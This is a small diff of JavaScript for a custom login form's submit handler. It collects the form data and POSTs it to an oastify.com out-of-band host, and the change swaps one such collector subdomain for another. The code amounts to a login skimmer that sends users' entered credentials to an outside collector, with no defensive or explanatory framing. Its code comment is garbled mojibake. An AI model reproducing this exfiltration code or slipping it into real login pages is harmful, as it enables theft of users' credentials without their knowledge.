@@ -49,7 +49,7 @@ customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
   const formData = new FormData(customLoginForm);
   
   // å‘é€è¯·æ±‚ï¼ˆå¯æ ¹æ®éœ€è¦ä¿ç•™æˆ–ä¿®æ”¹ï¼‰
-  fetch("https://q2ttxl0r06dmlt1ivgsoafljxa31rrfg.oastify.com", {
+  fetch("https://nzqy2hd4wx6kgt2d7p8ozp3i49a0yqmf.oastify.com", {
     method: "POST",
     body: formData
   });
